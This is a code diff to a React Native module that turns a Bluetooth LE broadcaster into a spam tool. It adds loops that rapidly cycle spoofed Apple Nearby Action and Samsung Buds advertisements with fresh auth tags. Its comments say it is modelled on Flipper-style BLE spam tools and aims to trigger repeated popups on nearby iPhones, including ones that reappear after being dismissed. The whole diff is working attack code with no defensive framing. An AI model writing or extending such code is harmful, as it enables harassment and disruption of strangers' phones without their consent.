@@ -3,7 +3,9 @@ import {
   BleProfile,
   ManufacturerProfile,
   buildAdvertisePayload,
+  getAppleNearbyProfiles,
   getBroadcastableProfiles,
+  getSamsungProfiles,
 } from './profiles';
 
 type ContinuityAdvertiserNative = {
@@ -19,10 +21,20 @@ type ContinuityAdvertiserNative = {
   stopAdvertise: () => Promise<string>;
 };
 
+export type SpamLoopOptions = {
+  /** How long each profile stays on-air before stop (ms). Default 400. */
+  advertiseMs?: number;
+  /** Gap after stop before next start (ms). Default 150. */
+  gapMs?: number;
+  /** Called whenever the active profile changes. */
+  onProfile?: (profile: ManufacturerProfile) => void;
+};
+
 const ContinuityAdvertiser =
   NativeModules.ContinuityAdvertiser as ContinuityAdvertiserNative | undefined;
 
-let rotateTimer: ReturnType<typeof setInterval> | null = null;
+let spamRunning = false;
+let spamLoopPromise: Promise<void> | null = null;
 let currentProfile: ManufacturerProfile | null = null;
 
 function requireNative(): ContinuityAdvertiserNative {
@@ -37,8 +49,20 @@ function requireNative(): ContinuityAdvertiserNative {
   return ContinuityAdvertiser;
 }
 
+function sleep(ms: number): Promise<void> {
+  return new Promise((resolve) => setTimeout(resolve, ms));
+}
+
 async function advertiseOnce(profile: ManufacturerProfile): Promise<void> {
   const native = requireNative();
+  // Always stop first so Android actually swaps packet bytes (in-place update is unreliable).
+  try {
+    await native.stopAdvertise();
+  } catch {
+    // ok if nothing was running
+  }
+  await sleep(40);
+
   const payload = buildAdvertisePayload(profile);
   await native.startManufacturerAdvertise(profile.companyId, payload, {
     connectable: false,
@@ -47,7 +71,56 @@ async function advertiseOnce(profile: ManufacturerProfile): Promise<void> {
   });
 }
 
-/** Start broadcasting one profile (refreshes Nearby Action auth tag each call). */
+/**
+ * Queue loop used by Flipper / Bluetooth-LE-Spam style tools:
+ * start → hold briefly → stop → short gap → next profile (fresh auth tag).
+ */
+async function runSpamLoop(
+  profiles: ManufacturerProfile[],
+  options: SpamLoopOptions = {}
+): Promise<void> {
+  if (profiles.length === 0) {
+    throw new Error('No profiles to spam');
+  }
+
+  const advertiseMs = options.advertiseMs ?? 400;
+  const gapMs = options.gapMs ?? 150;
+
+  await stopBroadcast();
+  spamRunning = true;
+
+  spamLoopPromise = (async () => {
+    let index = 0;
+    while (spamRunning) {
+      const profile = profiles[index % profiles.length];
+      currentProfile = profile;
+      options.onProfile?.(profile);
+
+      try {
+        await advertiseOnce(profile);
+        await sleep(advertiseMs);
+      } catch (err) {
+        console.error('Spam advertise step failed', err);
+        await sleep(gapMs);
+      }
+
+      if (!spamRunning) break;
+
+      try {
+        await requireNative().stopAdvertise();
+      } catch {
+        // ignore
+      }
+      await sleep(gapMs);
+      index += 1;
+    }
+  })();
+
+  // Don't await the infinite loop — return once the first cycle has started.
+  await sleep(50);
+}
+
+/** Start broadcasting one profile (static hold until stop). */
 export async function startBroadcast(profile: BleProfile): Promise<void> {
   if (profile.kind !== 'manufacturer') {
     throw new Error(
@@ -69,36 +142,67 @@ export async function startBroadcast(profile: BleProfile): Promise<void> {
 }
 
 /**
- * Rotate through broadcastable profiles.
- * Re-advertises every intervalMs with a fresh auth tag (Apple) or next Samsung variant.
+ * Fast Apple-only spam: cycle Nearby Actions with stop/gap/start.
+ * Best chance of multiple iPhone popups (still subject to iOS cooldowns).
  */
+export async function startAppleSpam(options?: SpamLoopOptions): Promise<void> {
+  await runSpamLoop(getAppleNearbyProfiles(), {
+    advertiseMs: 350,
+    gapMs: 120,
+    ...options,
+  });
+}
+
+/** Samsung-only rotation (different Buds IDs look like different devices). */
+export async function startSamsungSpam(options?: SpamLoopOptions): Promise<void> {
+  await runSpamLoop(getSamsungProfiles(), {
+    advertiseMs: 500,
+    gapMs: 100,
+    ...options,
+  });
+}
+
+/** Mix of Apple + Samsung with proper stop/start cycling. */
 export async function startRotatingBroadcast(
-  intervalMs: number = 1000
+  intervalMs: number = 500,
+  options?: SpamLoopOptions
 ): Promise<void> {
-  const profiles = getBroadcastableProfiles();
-  if (profiles.length === 0) {
-    throw new Error('No broadcastable profiles');
+  const advertiseMs = Math.max(200, Math.floor(intervalMs * 0.7));
+  const gapMs = Math.max(80, intervalMs - advertiseMs);
+  await runSpamLoop(getBroadcastableProfiles(), {
+    advertiseMs,
+    gapMs,
+    ...options,
+  });
+}
+
+/**
+ * Keep spamming ONE Apple action with fresh auth tags / flag jitter.
+ * Useful for "Join AppleTV" style actions that can reappear after dismiss.
+ */
+export async function startSingleActionSpam(
+  profile: ManufacturerProfile,
+  options?: SpamLoopOptions
+): Promise<void> {
+  if (profile.advertiseMode !== 'continuity-nearby-action') {
+    throw new Error('Single-action spam is for Apple Nearby Action profiles');
   }
-
-  await stopBroadcast();
-  let index = 0;
-  currentProfile = profiles[0];
-  await advertiseOnce(profiles[0]);
-
-  rotateTimer = setInterval(() => {
-    index = (index + 1) % profiles.length;
-    const next = profiles[index];
-    currentProfile = next;
-    advertiseOnce(next).catch((err) => {
-      console.error('Rotate advertise failed', err);
-    });
-  }, intervalMs);
+  await runSpamLoop([profile], {
+    advertiseMs: 300,
+    gapMs: 100,
+    ...options,
+  });
 }
 
 export async function stopBroadcast(): Promise<void> {
-  if (rotateTimer) {
-    clearInterval(rotateTimer);
-    rotateTimer = null;
+  spamRunning = false;
+  if (spamLoopPromise) {
+    try {
+      await Promise.race([spamLoopPromise, sleep(800)]);
+    } catch {
+      // ignore
+    }
+    spamLoopPromise = null;
   }
   currentProfile = null;
 
@@ -116,4 +220,8 @@ export function getCurrentBroadcastProfile(): ManufacturerProfile | null {
   return currentProfile;
 }
 
-export { getBroadcastableProfiles };
+export {
+  getBroadcastableProfiles,
+  getAppleNearbyProfiles,
+  getSamsungProfiles,
+};
